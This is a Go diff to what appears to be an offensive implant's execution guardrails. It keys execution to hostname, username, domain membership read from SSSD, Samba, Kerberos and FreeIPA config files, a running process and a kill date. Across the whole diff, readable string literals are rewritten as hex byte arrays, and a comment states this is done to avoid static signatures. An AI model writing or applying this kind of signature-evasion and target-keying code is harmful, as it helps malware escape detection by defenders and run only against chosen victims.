@@ -30,6 +30,41 @@ var (
 	safetyWorkHoursEnd   string = ""
 )
 
+// Exec requirements strings (constructed to avoid static signatures)
+var (
+	// File paths
+	erPathEtcHostname = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x68, 0x6f, 0x73, 0x74, 0x6e, 0x61, 0x6d, 0x65})                                                                         // /etc/hostname
+	erPathSssdConf    = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x73, 0x73, 0x73, 0x64, 0x2f, 0x73, 0x73, 0x73, 0x64, 0x2e, 0x63, 0x6f, 0x6e, 0x66})                                     // /etc/sssd/sssd.conf
+	erPathSmbConf     = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x73, 0x61, 0x6d, 0x62, 0x61, 0x2f, 0x73, 0x6d, 0x62, 0x2e, 0x63, 0x6f, 0x6e, 0x66})                                     // /etc/samba/smb.conf
+	erPathKrb5Conf    = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x6b, 0x72, 0x62, 0x35, 0x2e, 0x63, 0x6f, 0x6e, 0x66})                                                                   // /etc/krb5.conf
+	erPathIpaConf     = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x69, 0x70, 0x61, 0x2f, 0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 0x74, 0x2e, 0x63, 0x6f, 0x6e, 0x66})                         // /etc/ipa/default.conf
+	erPathProc        = string([]byte{0x2f, 0x70, 0x72, 0x6f, 0x63})                                                                                                                         // /proc
+	erPathTildeFwd    = string([]byte{0x7e, 0x2f})                                                                                                                                           // ~/
+
+	// Environment variable names
+	erEnvUser    = string([]byte{0x55, 0x53, 0x45, 0x52})                                           // USER
+	erEnvLogname = string([]byte{0x4c, 0x4f, 0x47, 0x4e, 0x41, 0x4d, 0x45})                         // LOGNAME
+
+	// Config file patterns
+	erPatternDomainsEq  = string([]byte{0x64, 0x6f, 0x6d, 0x61, 0x69, 0x6e, 0x73, 0x20, 0x3d})       // domains =
+	erPatternDomainsEq2 = string([]byte{0x64, 0x6f, 0x6d, 0x61, 0x69, 0x6e, 0x73, 0x3d})             // domains=
+	erPatternWorkgroup  = string([]byte{0x77, 0x6f, 0x72, 0x6b, 0x67, 0x72, 0x6f, 0x75, 0x70})       // workgroup
+	erPatternRealm      = string([]byte{0x72, 0x65, 0x61, 0x6c, 0x6d})                               // realm
+	erPatternDefRealm   = string([]byte{0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 0x74, 0x5f, 0x72, 0x65, 0x61, 0x6c, 0x6d}) // default_realm
+	erPatternDomainEq   = string([]byte{0x64, 0x6f, 0x6d, 0x61, 0x69, 0x6e, 0x20, 0x3d})             // domain =
+	erPatternDomainEq2  = string([]byte{0x64, 0x6f, 0x6d, 0x61, 0x69, 0x6e, 0x3d})                   // domain=
+
+	// Proc file names
+	erProcCmdline = string([]byte{0x63, 0x6d, 0x64, 0x6c, 0x69, 0x6e, 0x65})                         // cmdline
+	erProcComm    = string([]byte{0x63, 0x6f, 0x6d, 0x6d})                                           // comm
+
+	// String literals
+	erWordTrue = string([]byte{0x74, 0x72, 0x75, 0x65})                                              // true
+
+	// Time format strings
+	erTimeFmtFull = string([]byte{0x32, 0x30, 0x30, 0x36, 0x2d, 0x30, 0x31, 0x2d, 0x30, 0x32, 0x20, 0x31, 0x35, 0x3a, 0x30, 0x34, 0x3a, 0x30, 0x35}) // 2006-01-02 15:04:05
+)
+
 // PerformSafetyChecks runs all configured safety checks
 // Returns true if all checks pass, false otherwise
 func PerformSafetyChecks() bool {
@@ -65,7 +100,7 @@ func PerformSafetyChecks() bool {
 
 	// Check file existence
 	if safetyFilePath != "" {
-		mustExist := safetyFileMustExist == "true"
+		mustExist := safetyFileMustExist == erWordTrue
 		if !checkFile(safetyFilePath, mustExist) {
 			return false
 		}
@@ -115,7 +150,7 @@ func checkHostname(expected string) bool {
 
 	// Also check /etc/hostname as a fallback
 	if !strings.EqualFold(hostname, expected) {
-		if data, err := os.ReadFile("/etc/hostname"); err == nil {
+		if data, err := os.ReadFile(erPathEtcHostname); err == nil {
 			hostname = strings.TrimSpace(string(data))
 		}
 	}
@@ -129,9 +164,9 @@ func checkUsername(expected string) bool {
 	currentUser, err := user.Current()
 	if err != nil {
 		// Fallback to environment variable
-		username := os.Getenv("USER")
+		username := os.Getenv(erEnvUser)
 		if username == "" {
-			username = os.Getenv("LOGNAME")
+			username = os.Getenv(erEnvLogname)
 		}
 		return strings.EqualFold(username, expected)
 	}
@@ -175,7 +210,7 @@ func checkDomain(expected string) bool {
 
 // checkSSSDDomain checks SSSD configuration for domain membership
 func checkSSSDDomain() string {
-	file, err := os.Open("/etc/sssd/sssd.conf")
+	file, err := os.Open(erPathSssdConf)
 	if err != nil {
 		return ""
 	}
@@ -184,7 +219,7 @@ func checkSSSDDomain() string {
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
 		line := strings.TrimSpace(scanner.Text())
-		if strings.HasPrefix(line, "domains =") || strings.HasPrefix(line, "domains=") {
+		if strings.HasPrefix(line, erPatternDomainsEq) || strings.HasPrefix(line, erPatternDomainsEq2) {
 			parts := strings.Split(line, "=")
 			if len(parts) > 1 {
 				domain := strings.TrimSpace(parts[1])
@@ -203,7 +238,7 @@ func checkSSSDDomain() string {
 
 // checkSambaDomain checks Samba configuration for domain membership
 func checkSambaDomain() string {
-	file, err := os.Open("/etc/samba/smb.conf")
+	file, err := os.Open(erPathSmbConf)
 	if err != nil {
 		return ""
 	}
@@ -215,7 +250,7 @@ func checkSambaDomain() string {
 		lineLower := strings.ToLower(line)
 
 		// Look for "workgroup = DOMAIN" or "realm = domain.com"
-		if strings.HasPrefix(lineLower, "workgroup") || strings.HasPrefix(lineLower, "realm") {
+		if strings.HasPrefix(lineLower, erPatternWorkgroup) || strings.HasPrefix(lineLower, erPatternRealm) {
 			if strings.Contains(line, "=") {
 				parts := strings.Split(line, "=")
 				if len(parts) > 1 {
@@ -230,7 +265,7 @@ func checkSambaDomain() string {
 
 // checkKerberosRealm checks for Kerberos configuration
 func checkKerberosRealm() string {
-	file, err := os.Open("/etc/krb5.conf")
+	file, err := os.Open(erPathKrb5Conf)
 	if err != nil {
 		return ""
 	}
@@ -239,7 +274,7 @@ func checkKerberosRealm() string {
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
 		line := strings.TrimSpace(scanner.Text())
-		if strings.HasPrefix(strings.ToLower(line), "default_realm") {
+		if strings.HasPrefix(strings.ToLower(line), erPatternDefRealm) {
 			if strings.Contains(line, "=") {
 				parts := strings.Split(line, "=")
 				if len(parts) > 1 {
@@ -255,7 +290,7 @@ func checkKerberosRealm() string {
 // checkFreeIPADomain checks for FreeIPA/IdM domain membership
 func checkFreeIPADomain() string {
 	// Check /etc/ipa/default.conf
-	file, err := os.Open("/etc/ipa/default.conf")
+	file, err := os.Open(erPathIpaConf)
 	if err != nil {
 		return ""
 	}
@@ -264,7 +299,7 @@ func checkFreeIPADomain() string {
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
 		line := strings.TrimSpace(scanner.Text())
-		if strings.HasPrefix(line, "domain =") || strings.HasPrefix(line, "domain=") {
+		if strings.HasPrefix(line, erPatternDomainEq) || strings.HasPrefix(line, erPatternDomainEq2) {
 			parts := strings.Split(line, "=")
 			if len(parts) > 1 {
 				return strings.TrimSpace(parts[1])
@@ -278,7 +313,7 @@ func checkFreeIPADomain() string {
 // checkFile verifies file existence based on the requirement
 func checkFile(path string, mustExist bool) bool {
 	// Expand ~ to home directory if present
-	if strings.HasPrefix(path, "~/") {
+	if strings.HasPrefix(path, erPathTildeFwd) {
 		if home, err := os.UserHomeDir(); err == nil {
 			path = filepath.Join(home, path[2:])
 		}
@@ -308,8 +343,7 @@ func checkProcess(processName string) bool {
 
 // checkProcessViaProc checks for process via /proc filesystem
 func checkProcessViaProc(processName string) bool {
-	procDir := "/proc"
-	entries, err := os.ReadDir(procDir)
+	entries, err := os.ReadDir(erPathProc)
 	if err != nil {
 		return false
 	}
@@ -335,7 +369,7 @@ func checkProcessViaProc(processName string) bool {
 		}
 
 		// Read the cmdline file to get process name
-		cmdlinePath := filepath.Join(procDir, pid, "cmdline")
+		cmdlinePath := filepath.Join(erPathProc, pid, erProcCmdline)
 		cmdlineBytes, err := os.ReadFile(cmdlinePath)
 		if err != nil {
 			continue
@@ -351,7 +385,7 @@ func checkProcessViaProc(processName string) bool {
 		}
 
 		// Also check comm file for just the process name
-		commPath := filepath.Join(procDir, pid, "comm")
+		commPath := filepath.Join(erPathProc, pid, erProcComm)
 		commBytes, err := os.ReadFile(commPath)
 		if err != nil {
 			continue
@@ -397,7 +431,7 @@ func checkProcessGopsutil(processName string) bool {
 // checkKillDate verifies the current date is before the kill date
 func checkKillDate(killDateStr string) bool {
 	// Parse kill date (format: "2006-01-02 15:04:05")
-	killDate, err := time.Parse("2006-01-02 15:04:05", killDateStr)
+	killDate, err := time.Parse(erTimeFmtFull, killDateStr)
 	if err != nil {
 		// If we can't parse the kill date, fail safe and don't run
 		return false
